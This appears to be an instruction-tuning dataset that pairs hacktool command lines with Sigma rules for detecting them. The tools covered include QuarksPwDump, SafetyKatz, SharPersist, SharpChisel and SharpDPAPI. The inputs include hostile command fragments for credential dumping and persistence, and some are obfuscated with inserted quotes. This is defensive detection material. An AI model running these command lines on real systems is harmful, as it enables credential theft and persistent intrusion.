{"instruction": "Write Sigma rule to detect payload:", "input": "\\QuarksPwDump", "output": "title: HackTool - Quarks PwDump Execution\nid: 0685b176-c816-4837-8e7b-1216f346636b\nstatus: test\ndescription: Detects usage of the Quarks PwDump tool via commandline arguments\nreferences:\n    - https://github.com/quarkslab/quarkspwdump\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/seedworm-apt-iran-middle-east\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-05\nmodified: 2023-02-05\ntags:\n    - attack.credential-access\n    - attack.t1003.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\QuarksPwDump.exe'\n    selection_cli:\n        CommandLine:\n            - ' -dhl'\n            - ' --dump-hash-local'\n            - ' -dhdc'\n            - ' --dump-hash-domain-cached'\n            - ' --dump-bitlocker'\n            - ' -dhd '\n            - ' --dump-hash-domain '\n            - '--ntds-file'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\QuarksPwDump.exe", "output": "title: HackTool - Quarks PwDump Execution\nid: 0685b176-c816-4837-8e7b-1216f346636b\nstatus: test\ndescription: Detects usage of the Quarks PwDump tool via commandline arguments\nreferences:\n    - https://github.com/quarkslab/quarkspwdump\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/seedworm-apt-iran-middle-east\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-05\nmodified: 2023-02-05\ntags:\n    - attack.credential-access\n    - attack.t1003.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\QuarksPwDump.exe'\n    selection_cli:\n        CommandLine:\n            - ' -dhl'\n            - ' --dump-hash-local'\n            - ' -dhdc'\n            - ' --dump-hash-domain-cached'\n            - ' --dump-bitlocker'\n            - ' -dhd '\n            - ' --dump-hash-domain '\n            - '--ntds-file'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SafetyKatz.exe SafetyKatz.exe", "output": "title: HackTool - SafetyKatz Execution\nid: b1876533-4ed5-4a83-90f3-b8645840a413\nstatus: test\ndescription: Detects the execution of the hacktool SafetyKatz via PE information and default Image name\nreferences:\n    - https://github.com/GhostPack/SafetyKatz\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-20\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\SafetyKatz.exe'\n        - OriginalFileName: 'SafetyKatz.exe'\n        - Description: 'SafetyKatz'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SafetyKatz.exe SafetyK\\\"atz.exe\\\"", "output": "title: HackTool - SafetyKatz Execution\nid: b1876533-4ed5-4a83-90f3-b8645840a413\nstatus: test\ndescription: Detects the execution of the hacktool SafetyKatz via PE information and default Image name\nreferences:\n    - https://github.com/GhostPack/SafetyKatz\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-20\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\SafetyKatz.exe'\n        - OriginalFileName: 'SafetyKatz.exe'\n        - Description: 'SafetyKatz'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SafetyKatz SafetyKatz", "output": "title: HackTool - SafetyKatz Execution\nid: b1876533-4ed5-4a83-90f3-b8645840a413\nstatus: test\ndescription: Detects the execution of the hacktool SafetyKatz via PE information and default Image name\nreferences:\n    - https://github.com/GhostPack/SafetyKatz\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-20\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\SafetyKatz.exe'\n        - OriginalFileName: 'SafetyKatz.exe'\n        - Description: 'SafetyKatz'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SafetyKatz.exe SafetyKatz.exe", "output": "title: HackTool - SafetyKatz Execution\nid: b1876533-4ed5-4a83-90f3-b8645840a413\nstatus: test\ndescription: Detects the execution of the hacktool SafetyKatz via PE information and default Image name\nreferences:\n    - https://github.com/GhostPack/SafetyKatz\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-20\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\SafetyKatz.exe'\n        - OriginalFileName: 'SafetyKatz.exe'\n        - Description: 'SafetyKatz'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "PasswordDump.exe PasswordDump.exe", "output": "title: HackTool - SecurityXploded Execution\nid: 7679d464-4f74-45e2-9e01-ac66c5eb041a\nstatus: stable\ndescription: Detects the execution of SecurityXploded Tools\nreferences:\n    - https://securityxploded.com/\n    - https://web.archive.org/web/20200601000524/https://cyberx-labs.com/blog/gangnam-industrial-style-apt-campaign-targets-korean-industrial-companies/\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-12-19\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1555\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Company: SecurityXploded\n        - Image|endswith: 'PasswordDump.exe'\n        - OriginalFileName|endswith: 'PasswordDump.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "PasswordDump.exe \\\"PasswordDump.exe\\\"", "output": "title: HackTool - SecurityXploded Execution\nid: 7679d464-4f74-45e2-9e01-ac66c5eb041a\nstatus: stable\ndescription: Detects the execution of SecurityXploded Tools\nreferences:\n    - https://securityxploded.com/\n    - https://web.archive.org/web/20200601000524/https://cyberx-labs.com/blog/gangnam-industrial-style-apt-campaign-targets-korean-industrial-companies/\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-12-19\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1555\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Company: SecurityXploded\n        - Image|endswith: 'PasswordDump.exe'\n        - OriginalFileName|endswith: 'PasswordDump.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "PasswordDump PasswordDump", "output": "title: HackTool - SecurityXploded Execution\nid: 7679d464-4f74-45e2-9e01-ac66c5eb041a\nstatus: stable\ndescription: Detects the execution of SecurityXploded Tools\nreferences:\n    - https://securityxploded.com/\n    - https://web.archive.org/web/20200601000524/https://cyberx-labs.com/blog/gangnam-industrial-style-apt-campaign-targets-korean-industrial-companies/\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-12-19\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1555\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Company: SecurityXploded\n        - Image|endswith: 'PasswordDump.exe'\n        - OriginalFileName|endswith: 'PasswordDump.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "PasswordDump.exe PasswordDump.exe", "output": "title: HackTool - SecurityXploded Execution\nid: 7679d464-4f74-45e2-9e01-ac66c5eb041a\nstatus: stable\ndescription: Detects the execution of SecurityXploded Tools\nreferences:\n    - https://securityxploded.com/\n    - https://web.archive.org/web/20200601000524/https://cyberx-labs.com/blog/gangnam-industrial-style-apt-campaign-targets-korean-industrial-companies/\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-12-19\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1555\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Company: SecurityXploded\n        - Image|endswith: 'PasswordDump.exe'\n        - OriginalFileName|endswith: 'PasswordDump.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SharPersist.exe -t schtask -c -t startupfolder -c -t reg -c -m add -t service -c -m add -t schtask -c -m add", "output": "title: HackTool - SharPersist Execution\nid: 26488ad0-f9fd-4536-876f-52fea846a2e4\nstatus: test\ndescription: Detects the execution of the hacktool SharPersist - used to deploy various different kinds of persistence mechanisms\nreferences:\n    - https://www.mandiant.com/resources/blog/sharpersist-windows-persistence-toolkit\n    - https://github.com/mandiant/SharPersist\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-09-15\nmodified: 2023-02-04\ntags:\n    - attack.persistence\n    - attack.t1053\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\SharPersist.exe'\n        - Product: 'SharPersist'\n    selection_cli_1:\n        CommandLine|contains:\n            - ' -t schtask -c '\n            - ' -t startupfolder -c '\n    selection_cli_2:\n        CommandLine|contains|all:\n            - ' -t reg -c '\n            - ' -m add'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - ' -t service -c '\n            - ' -m add'\n    selection_cli_4:\n        CommandLine|contains|all:\n            - ' -t schtask -c '\n            - ' -m add'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SharPersist.exe -t schtask -c -t startupfolder -c -t reg -c -m \"a\"dd -t service -c -m add -t schtask -c -m add", "output": "title: HackTool - SharPersist Execution\nid: 26488ad0-f9fd-4536-876f-52fea846a2e4\nstatus: test\ndescription: Detects the execution of the hacktool SharPersist - used to deploy various different kinds of persistence mechanisms\nreferences:\n    - https://www.mandiant.com/resources/blog/sharpersist-windows-persistence-toolkit\n    - https://github.com/mandiant/SharPersist\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-09-15\nmodified: 2023-02-04\ntags:\n    - attack.persistence\n    - attack.t1053\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\SharPersist.exe'\n        - Product: 'SharPersist'\n    selection_cli_1:\n        CommandLine|contains:\n            - ' -t schtask -c '\n            - ' -t startupfolder -c '\n    selection_cli_2:\n        CommandLine|contains|all:\n            - ' -t reg -c '\n            - ' -m add'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - ' -t service -c '\n            - ' -m add'\n    selection_cli_4:\n        CommandLine|contains|all:\n            - ' -t schtask -c '\n            - ' -m add'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SharPersist.exe -t schtask -c -t startupfolder -c -t reg -c -m add -t service -c -m add -t schtask -c -m add", "output": "title: HackTool - SharPersist Execution\nid: 26488ad0-f9fd-4536-876f-52fea846a2e4\nstatus: test\ndescription: Detects the execution of the hacktool SharPersist - used to deploy various different kinds of persistence mechanisms\nreferences:\n    - https://www.mandiant.com/resources/blog/sharpersist-windows-persistence-toolkit\n    - https://github.com/mandiant/SharPersist\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-09-15\nmodified: 2023-02-04\ntags:\n    - attack.persistence\n    - attack.t1053\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\SharPersist.exe'\n        - Product: 'SharPersist'\n    selection_cli_1:\n        CommandLine|contains:\n            - ' -t schtask -c '\n            - ' -t startupfolder -c '\n    selection_cli_2:\n        CommandLine|contains|all:\n            - ' -t reg -c '\n            - ' -m add'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - ' -t service -c '\n            - ' -m add'\n    selection_cli_4:\n        CommandLine|contains|all:\n            - ' -t schtask -c '\n            - ' -m add'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SharPersist -t schtask -c -t startupfolder -c -t reg -c -m add -t service -c -m add -t schtask -c -m add", "output": "title: HackTool - SharPersist Execution\nid: 26488ad0-f9fd-4536-876f-52fea846a2e4\nstatus: test\ndescription: Detects the execution of the hacktool SharPersist - used to deploy various different kinds of persistence mechanisms\nreferences:\n    - https://www.mandiant.com/resources/blog/sharpersist-windows-persistence-toolkit\n    - https://github.com/mandiant/SharPersist\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-09-15\nmodified: 2023-02-04\ntags:\n    - attack.persistence\n    - attack.t1053\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\SharPersist.exe'\n        - Product: 'SharPersist'\n    selection_cli_1:\n        CommandLine|contains:\n            - ' -t schtask -c '\n            - ' -t startupfolder -c '\n    selection_cli_2:\n        CommandLine|contains|all:\n            - ' -t reg -c '\n            - ' -m add'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - ' -t service -c '\n            - ' -m add'\n    selection_cli_4:\n        CommandLine|contains|all:\n            - ' -t schtask -c '\n            - ' -m add'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SharPersist.exe -t schtask -c -t startupfolder -c -t reg -c -m add -t service -c -m add -t schtask -c -m add", "output": "title: HackTool - SharPersist Execution\nid: 26488ad0-f9fd-4536-876f-52fea846a2e4\nstatus: test\ndescription: Detects the execution of the hacktool SharPersist - used to deploy various different kinds of persistence mechanisms\nreferences:\n    - https://www.mandiant.com/resources/blog/sharpersist-windows-persistence-toolkit\n    - https://github.com/mandiant/SharPersist\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-09-15\nmodified: 2023-02-04\ntags:\n    - attack.persistence\n    - attack.t1053\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\SharPersist.exe'\n        - Product: 'SharPersist'\n    selection_cli_1:\n        CommandLine|contains:\n            - ' -t schtask -c '\n            - ' -t startupfolder -c '\n    selection_cli_2:\n        CommandLine|contains|all:\n            - ' -t reg -c '\n            - ' -m add'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - ' -t service -c '\n            - ' -m add'\n    selection_cli_4:\n        CommandLine|contains|all:\n            - ' -t schtask -c '\n            - ' -m add'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SharpLdapWhoami.exe SharpLdapWhoami", "output": "title: HackTool - SharpLdapWhoami Execution\nid: d9367cbb-c2e0-47ce-bdc0-128cb6da898d\nstatus: test\ndescription: Detects SharpLdapWhoami, a whoami alternative that queries the LDAP service on a domain controller\nreferences:\n    - https://github.com/bugch3ck/SharpLdapWhoami\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-08-29\nmodified: 2023-02-04\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_name:\n        Image|endswith: '\\SharpLdapWhoami.exe'\n    selection_pe: # in case the file has been renamed after compilation\n        - OriginalFileName|contains: 'SharpLdapWhoami'\n        - Product: 'SharpLdapWhoami'\n    selection_flags1:\n        CommandLine|endswith:\n            - ' /method:ntlm'\n            - ' /method:kerb'\n            - ' /method:nego'\n            - ' /m:nego'\n            - ' /m:ntlm'\n            - ' /m:kerb'\n    condition: 1 of selection*\nfalsepositives:\n    - Programs that use the same command line flags\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SharpLdapWhoami.exe \\\"SharpLdapWhoami\\\"", "output": "title: HackTool - SharpLdapWhoami Execution\nid: d9367cbb-c2e0-47ce-bdc0-128cb6da898d\nstatus: test\ndescription: Detects SharpLdapWhoami, a whoami alternative that queries the LDAP service on a domain controller\nreferences:\n    - https://github.com/bugch3ck/SharpLdapWhoami\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-08-29\nmodified: 2023-02-04\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_name:\n        Image|endswith: '\\SharpLdapWhoami.exe'\n    selection_pe: # in case the file has been renamed after compilation\n        - OriginalFileName|contains: 'SharpLdapWhoami'\n        - Product: 'SharpLdapWhoami'\n    selection_flags1:\n        CommandLine|endswith:\n            - ' /method:ntlm'\n            - ' /method:kerb'\n            - ' /method:nego'\n            - ' /m:nego'\n            - ' /m:ntlm'\n            - ' /m:kerb'\n    condition: 1 of selection*\nfalsepositives:\n    - Programs that use the same command line flags\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SharpLdapWhoami SharpLdapWhoami", "output": "title: HackTool - SharpLdapWhoami Execution\nid: d9367cbb-c2e0-47ce-bdc0-128cb6da898d\nstatus: test\ndescription: Detects SharpLdapWhoami, a whoami alternative that queries the LDAP service on a domain controller\nreferences:\n    - https://github.com/bugch3ck/SharpLdapWhoami\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-08-29\nmodified: 2023-02-04\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_name:\n        Image|endswith: '\\SharpLdapWhoami.exe'\n    selection_pe: # in case the file has been renamed after compilation\n        - OriginalFileName|contains: 'SharpLdapWhoami'\n        - Product: 'SharpLdapWhoami'\n    selection_flags1:\n        CommandLine|endswith:\n            - ' /method:ntlm'\n            - ' /method:kerb'\n            - ' /method:nego'\n            - ' /m:nego'\n            - ' /m:ntlm'\n            - ' /m:kerb'\n    condition: 1 of selection*\nfalsepositives:\n    - Programs that use the same command line flags\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SharpLdapWhoami.exe SharpLdapWhoami", "output": "title: HackTool - SharpLdapWhoami Execution\nid: d9367cbb-c2e0-47ce-bdc0-128cb6da898d\nstatus: test\ndescription: Detects SharpLdapWhoami, a whoami alternative that queries the LDAP service on a domain controller\nreferences:\n    - https://github.com/bugch3ck/SharpLdapWhoami\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-08-29\nmodified: 2023-02-04\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_name:\n        Image|endswith: '\\SharpLdapWhoami.exe'\n    selection_pe: # in case the file has been renamed after compilation\n        - OriginalFileName|contains: 'SharpLdapWhoami'\n        - Product: 'SharpLdapWhoami'\n    selection_flags1:\n        CommandLine|endswith:\n            - ' /method:ntlm'\n            - ' /method:kerb'\n            - ' /method:nego'\n            - ' /m:nego'\n            - ' /m:ntlm'\n            - ' /m:kerb'\n    condition: 1 of selection*\nfalsepositives:\n    - Programs that use the same command line flags\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SharpChisel.exe", "output": "title: HackTool - SharpChisel Execution\nid: cf93e05e-d798-4d9e-b522-b0248dc61eaf\nrelated:\n    - id: 8b0e12da-d3c3-49db-bb4f-256703f380e5\n      type: similar\nstatus: test\ndescription: Detects usage of the Sharp Chisel via the commandline arguments\nreferences:\n    - https://github.com/shantanu561993/SharpChisel\n    - https://www.sentinelone.com/labs/wading-through-muddy-waters-recent-activity-of-an-iranian-state-sponsored-threat-actor/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-05\nmodified: 2023-02-13\ntags:\n    - attack.command-and-control\n    - attack.t1090.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\SharpChisel.exe'\n        - Product: 'SharpChisel'\n    # See rule 8b0e12da-d3c3-49db-bb4f-256703f380e5 for Chisel.exe coverage\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"\\SharpChisel.exe\\\"", "output": "title: HackTool - SharpChisel Execution\nid: cf93e05e-d798-4d9e-b522-b0248dc61eaf\nrelated:\n    - id: 8b0e12da-d3c3-49db-bb4f-256703f380e5\n      type: similar\nstatus: test\ndescription: Detects usage of the Sharp Chisel via the commandline arguments\nreferences:\n    - https://github.com/shantanu561993/SharpChisel\n    - https://www.sentinelone.com/labs/wading-through-muddy-waters-recent-activity-of-an-iranian-state-sponsored-threat-actor/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-05\nmodified: 2023-02-13\ntags:\n    - attack.command-and-control\n    - attack.t1090.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\SharpChisel.exe'\n        - Product: 'SharpChisel'\n    # See rule 8b0e12da-d3c3-49db-bb4f-256703f380e5 for Chisel.exe coverage\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SharpChisel", "output": "title: HackTool - SharpChisel Execution\nid: cf93e05e-d798-4d9e-b522-b0248dc61eaf\nrelated:\n    - id: 8b0e12da-d3c3-49db-bb4f-256703f380e5\n      type: similar\nstatus: test\ndescription: Detects usage of the Sharp Chisel via the commandline arguments\nreferences:\n    - https://github.com/shantanu561993/SharpChisel\n    - https://www.sentinelone.com/labs/wading-through-muddy-waters-recent-activity-of-an-iranian-state-sponsored-threat-actor/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-05\nmodified: 2023-02-13\ntags:\n    - attack.command-and-control\n    - attack.t1090.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\SharpChisel.exe'\n        - Product: 'SharpChisel'\n    # See rule 8b0e12da-d3c3-49db-bb4f-256703f380e5 for Chisel.exe coverage\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SharpChisel.exe", "output": "title: HackTool - SharpChisel Execution\nid: cf93e05e-d798-4d9e-b522-b0248dc61eaf\nrelated:\n    - id: 8b0e12da-d3c3-49db-bb4f-256703f380e5\n      type: similar\nstatus: test\ndescription: Detects usage of the Sharp Chisel via the commandline arguments\nreferences:\n    - https://github.com/shantanu561993/SharpChisel\n    - https://www.sentinelone.com/labs/wading-through-muddy-waters-recent-activity-of-an-iranian-state-sponsored-threat-actor/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-05\nmodified: 2023-02-13\ntags:\n    - attack.command-and-control\n    - attack.t1090.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\SharpChisel.exe'\n        - Product: 'SharpChisel'\n    # See rule 8b0e12da-d3c3-49db-bb4f-256703f380e5 for Chisel.exe coverage\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SharpDPAPI.exe SharpDPAPI.exe backupkey blob certificates credentials keepass masterkeys rdg vaults { }: /file: /machine /mkfile: /password: /pvk: /server: /target: /unprotect", "output": "title: HackTool - SharpDPAPI Execution\nid: c7d33b50-f690-4b51-8cfb-0fb912a31e57\nstatus: test\ndescription: |\n    Detects the execution of the SharpDPAPI tool based on CommandLine flags and PE metadata.\n    SharpDPAPI is a C# port of some DPAPI functionality from the Mimikatz project.\nreferences:\n    - https://github.com/GhostPack/SharpDPAPI\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2024-06-26\ntags:\n    - attack.privilege-escalation\n    - attack.defense-evasion\n    - attack.t1134.001\n    - attack.t1134.003\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\SharpDPAPI.exe'\n        - OriginalFileName: 'SharpDPAPI.exe'\n    selection_other_cli:\n        CommandLine|contains:\n            - ' backupkey '\n            - ' blob '\n            - ' certificates '\n            - ' credentials '\n            - ' keepass '\n            - ' masterkeys '\n            - ' rdg '\n            - ' vaults '\n    selection_other_options_guid:\n        CommandLine|contains|all:\n            - ' {'\n            - '}:'\n    selection_other_options_flags:\n        CommandLine|contains:\n            - ' /file:'\n            - ' /machine'\n            - ' /mkfile:'\n            - ' /password:'\n            - ' /pvk:'\n            - ' /server:'\n            - ' /target:'\n            - ' /unprotect'\n    condition: selection_img or (selection_other_cli and 1 of selection_other_options_*)\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SharpDPAPI.exe SharpDPAPI.exe backupkey blob certificates credentials keepass masterkeys rdg \\\"v\\\"\\\"a\\\"\\\"u\\\"\\\"l\\\"\\\"t\\\"\\\"s\\\" { }: /file: /machine /mkfile: /password: /pvk: /server: /target: /unprotect", "output": "title: HackTool - SharpDPAPI Execution\nid: c7d33b50-f690-4b51-8cfb-0fb912a31e57\nstatus: test\ndescription: |\n    Detects the execution of the SharpDPAPI tool based on CommandLine flags and PE metadata.\n    SharpDPAPI is a C# port of some DPAPI functionality from the Mimikatz project.\nreferences:\n    - https://github.com/GhostPack/SharpDPAPI\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2024-06-26\ntags:\n    - attack.privilege-escalation\n    - attack.defense-evasion\n    - attack.t1134.001\n    - attack.t1134.003\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\SharpDPAPI.exe'\n        - OriginalFileName: 'SharpDPAPI.exe'\n    selection_other_cli:\n        CommandLine|contains:\n            - ' backupkey '\n            - ' blob '\n            - ' certificates '\n            - ' credentials '\n            - ' keepass '\n            - ' masterkeys '\n            - ' rdg '\n            - ' vaults '\n    selection_other_options_guid:\n        CommandLine|contains|all:\n            - ' {'\n            - '}:'\n    selection_other_options_flags:\n        CommandLine|contains:\n            - ' /file:'\n            - ' /machine'\n            - ' /mkfile:'\n            - ' /password:'\n            - ' /pvk:'\n            - ' /server:'\n            - ' /target:'\n            - ' /unprotect'\n    condition: selection_img or (selection_other_cli and 1 of selection_other_options_*)\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SharpDPAPI SharpDPAPI backupkey blob certificates credentials keepass masterkeys rdg vaults { }: /file: /machine /mkfile: /password: /pvk: /server: /target: /unprotect", "output": "title: HackTool - SharpDPAPI Execution\nid: c7d33b50-f690-4b51-8cfb-0fb912a31e57\nstatus: test\ndescription: |\n    Detects the execution of the SharpDPAPI tool based on CommandLine flags and PE metadata.\n    SharpDPAPI is a C# port of some DPAPI functionality from the Mimikatz project.\nreferences:\n    - https://github.com/GhostPack/SharpDPAPI\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2024-06-26\ntags:\n    - attack.privilege-escalation\n    - attack.defense-evasion\n    - attack.t1134.001\n    - attack.t1134.003\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\SharpDPAPI.exe'\n        - OriginalFileName: 'SharpDPAPI.exe'\n    selection_other_cli:\n        CommandLine|contains:\n            - ' backupkey '\n            - ' blob '\n            - ' certificates '\n            - ' credentials '\n            - ' keepass '\n            - ' masterkeys '\n            - ' rdg '\n            - ' vaults '\n    selection_other_options_guid:\n        CommandLine|contains|all:\n            - ' {'\n            - '}:'\n    selection_other_options_flags:\n        CommandLine|contains:\n            - ' /file:'\n            - ' /machine'\n            - ' /mkfile:'\n            - ' /password:'\n            - ' /pvk:'\n            - ' /server:'\n            - ' /target:'\n            - ' /unprotect'\n    condition: selection_img or (selection_other_cli and 1 of selection_other_options_*)\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SharpDPAPI.exe SharpDPAPI.exe backupkey blob certificates credentials keepass masterkeys rdg vaults { }: /file: /machine /mkfile: /password: /pvk: /server: /target: /unprotect", "output": "title: HackTool - SharpDPAPI Execution\nid: c7d33b50-f690-4b51-8cfb-0fb912a31e57\nstatus: test\ndescription: |\n    Detects the execution of the SharpDPAPI tool based on CommandLine flags and PE metadata.\n    SharpDPAPI is a C# port of some DPAPI functionality from the Mimikatz project.\nreferences:\n    - https://github.com/GhostPack/SharpDPAPI\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2024-06-26\ntags:\n    - attack.privilege-escalation\n    - attack.defense-evasion\n    - attack.t1134.001\n    - attack.t1134.003\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\SharpDPAPI.exe'\n        - OriginalFileName: 'SharpDPAPI.exe'\n    selection_other_cli:\n        CommandLine|contains:\n            - ' backupkey '\n            - ' blob '\n            - ' certificates '\n            - ' credentials '\n            - ' keepass '\n            - ' masterkeys '\n            - ' rdg '\n            - ' vaults '\n    selection_other_options_guid:\n        CommandLine|contains|all:\n            - ' {'\n            - '}:'\n    selection_other_options_flags:\n        CommandLine|contains:\n            - ' /file:'\n            - ' /machine'\n            - ' /mkfile:'\n            - ' /password:'\n            - ' /pvk:'\n            - ' /server:'\n            - ' /target:'\n            - ' /unprotect'\n    condition: selection_img or (selection_other_cli and 1 of selection_other_options_*)\nfalsepositives:\n    - Unknown\nlevel: high"}
